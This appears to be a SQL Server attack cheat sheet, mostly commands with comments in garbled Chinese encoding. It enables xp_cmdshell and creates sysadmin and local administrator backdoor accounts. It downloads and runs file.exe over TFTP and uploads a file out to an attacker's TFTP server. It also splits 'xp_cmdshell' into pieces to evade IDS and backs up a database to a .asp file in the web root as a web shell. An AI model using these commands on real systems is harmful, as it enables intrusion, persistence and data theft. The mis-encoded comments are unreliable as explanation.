


select name from master.dbo.sysdatabases where dbid>=7  

select * from CHIS.dbo.sysobjects WHERE xtype ='u' 

 
EXEC sp_configure 'show advanced options', 1
GO 
RECONFIGURE
GO 
EXEC sp_configure 'xp_cmdshell', 1
GO 
RECONFIGURE
GO
exec master.dbo.sp_addlogin test,test;					-- //������ݿ��û��û�test,����Ϊtest
exec master.dbo.sp_password test,123456,test;			-- //���������룬������䣨��test�������Ϊ123456��
exec master.dbo.sp_addsrvrolemember test,sysadmin;		-- //��test�ӵ�sysadmin��,�����ĳ�Ա��ִ���κβ���
exec master.dbo.xp_cmdshell 'net user test test /add';	-- //���ϵͳ�û�test,����Ϊtest
exec master.dbo.xp_cmdshell 'net localgroup administrators test /add';-- //��ϵͳ�û�test����Ϊ����Ա


--ͨ��SQLSERVERע��©�������ݿ����Ա�ʺź�ϵͳ����Ա�ʺ�[��ǰ�ʺű�����SYSADMIN��]
 

--�����������������ݿ��ϵͳ�ڶ�������test����Ա�˺���


--��������δ���ķ��������ļ�file.exe��������[ǰ��������뽫��ĵ�����ΪTFTP����������69�˿ڴ�]


exec master.dbo.xp_cmdshell 'tftp �Ci 192.168 get file.exe';--


--Ȼ����������ļ���
exec master.dbo.xp_cmdshell 'file.exe';--


--���ط��������ļ�file2.doc������TFTP������[�ļ��������]:


exec master.dbo.xp_cmdshell 'tftp �Ci ���IP Put file2.doc';--


--�ƹ�IDS�ļ��[ʹ�ñ���]
declare @a sysname set @a='xp_'+'cmdshell' exec @a 'dir c:\'
declare @a sysname set @a='xp'+'_cm'+'dshell' exec @a 'dir c:\' 


--�¼ӵģ�


--��һ����ֻ��һ���ֶΣ�����Ϊimage,��asp����д�롣�������ݿ�Ϊ�ļ�
backup database dbname to disk='d:\web\db.asp'; 


--����õ�ϵͳ����ϵͳ�����ݿ�ϵͳ�汾��
(select @@VERSION);


EXEC sys.sp_configure @configname = '', -- varchar(35)
    @configvalue = 0 -- int
